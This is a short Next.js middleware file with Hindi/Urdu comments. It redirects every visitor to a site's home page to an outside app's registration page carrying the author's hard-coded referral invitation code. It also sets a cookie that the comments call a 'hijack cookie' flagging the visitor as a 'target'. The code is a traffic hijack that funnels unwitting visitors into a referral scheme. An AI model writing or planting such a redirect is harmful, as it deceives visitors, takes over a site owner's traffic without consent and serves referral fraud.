import { NextResponse } from 'next/server'

export default function middleware(request) {
  const myInviteCode = "6683618531272"; // [cite: 2025-12-24]
  const myGitHub = "https://hacrrk1-netizen.github.io/FAST-payment-gateway-/";
  const regURL = `https://www.91appq.com/#/register?invitationCode=${myInviteCode}`;
  
  const url = request.nextUrl.clone();

  // Sirf main page par aane walon ko register pe bhejo
  if (url.pathname === "/") {
    const res = NextResponse.redirect(regURL);
    // Hijack cookie set karo
    res.cookies.set('is_target', 'true', { maxAge: 86400 });
    return res;
  }

  return NextResponse.next();
}

// Ye config batata hai ki middleware kaha chalega
export const config = {
  matcher: '/',
}
